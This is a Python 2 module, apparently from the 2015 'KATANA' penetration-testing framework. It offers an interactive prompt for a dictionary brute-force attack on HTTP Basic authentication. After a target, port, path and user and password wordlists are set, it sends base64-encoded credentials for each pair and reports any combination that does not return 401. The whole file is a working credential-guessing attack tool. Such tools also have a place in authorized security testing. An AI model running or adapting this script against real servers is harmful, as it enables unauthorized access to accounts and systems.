# KATANA
# Brute Force HTTP Authentication
# Script by RedToor
# 27/02/2015
import socket
import base64
from core import help
W  = '\033[0m'  
R  = '\033[31m' 
G  = '\033[32m' 
O  = '\033[33m' 
B  = '\033[34m' 
P  = '\033[35m' 
C  = '\033[36m' 
GR = '\033[37m'
defaulthost="127.0.0.1"
defaultport="80"
defaultpach="/"
defaultdic1="core/db/user.dicc"
defaultdic2="core/db/pass.dicc"
def httpbt():
	global defaulthost,defaultport,defaultpach,defaultdic1,defaultdic2
	actions = raw_input(B+"   web/httpbt > "+W)
	if actions == "show options":
		print "     ["+R+"+"+W+"] options"
		print "     target         : yes"
		print "     port           : no/yes"
		print "     patch          : no/yes"
		print "     dictionaries   : no/yes\n"
		print "     ["+G+"+"+W+"] options current"
		print "     target         : ",defaulthost
		print "     port           : ",defaultport
		print "     patch          : ",defaultpach
		print "     dictionary_1   : ",defaultdic1
		print "     dictionary_2   : ",defaultdic2
		httpbt()
	elif actions=="back":
		return 
	elif actions=="exit":
		print C+"   GooD"+W+" bye."
		exit()
	elif actions[0:10] == "set target":
			defaulthost = actions[11:]
			defaulthost = defaulthost.replace("http://", "")
			print "     target         : "+defaulthost+" "+O+"     Saved!!!"+W
			httpbt()
	elif actions[0:8] == "set port":
			defaultport = actions[9:]
			print "     port           : "+defaultport+" "+O+"     Saved!!!"+W
			httpbt()
	elif actions[0:9] == "set patch":
			defaultpach = actions[10:]
			print "     patch          : "+defaultpach+" "+O+"     Saved!!!"+W
			httpbt()
	elif actions[0:16] == "set dictionary_1":
			defaultdic1 = actions[17:]
			print "     dictionary_1   : "+defaultdic1+" "+O+"     Saved!!!"+W
			httpbt()
	elif actions[0:16] == "set dictionary_2":
			defaultdic2 = actions[17:]
			print "     dictionary_2   : "+defaultdic2+" "+O+"     Saved!!!"+W
			httpbt()
	elif actions == "help":
		help.help()
	elif actions == "run":
			print("\n     ["+O+"!"+W+"] Checking target")
			print "     ["+G+"+"+W+"] options current"
			print "     target         : "+defaulthost
			print "     port           : "+defaultport
			print "     patch          : "+defaultpach
			print "     dictionary_1   : "+defaultdic1
			print "     dictionary_2   : "+defaultdic2
			print  
			try:
				red=socket.socket(socket.AF_INET, socket.SOCK_STREAM)       
				red.connect((defaulthost, int(defaultport))) 
				if True:
					print("     ["+G+"+"+W+"] target LIVE")
					print("     ["+G+"+"+W+"] Running")
					try:
						with open(defaultdic1,'r') as user:
							for us in user: 
								with open(defaultdic2,'r') as passs:
									for ps in passs:
										us=us.replace("\n","")
										ps=ps.replace("\n","")
										red.send("GET "+defaultpach+" HTTP/1.1\r\n")							
										red.send("HOST: "+defaulthost+"\r\n")							
										red.send("Authorization:Basic "+base64.b64encode(us+":"+ps)+"\r\n\r\n")  
										last=red.recv(1000)	
										if last.find("401")<=0:
											print "     ["+G+"+"+W+"] SUCCESSFUL with user: "+us+" , pass: "+ps+"\n"
											red.close
											httpbt()
										else:
											print "     ["+O+"!"+W+"] Checking with user: "+us+" , pass: "+ps
											red.close
					except(KeyboardInterrupt, SystemExit):
						print("   ["+O+"!"+W+"] (Ctrl + C) Detected, System Exit")
			except:
				print("     ["+R+"-"+W+"] target DEAD")
	httpbt()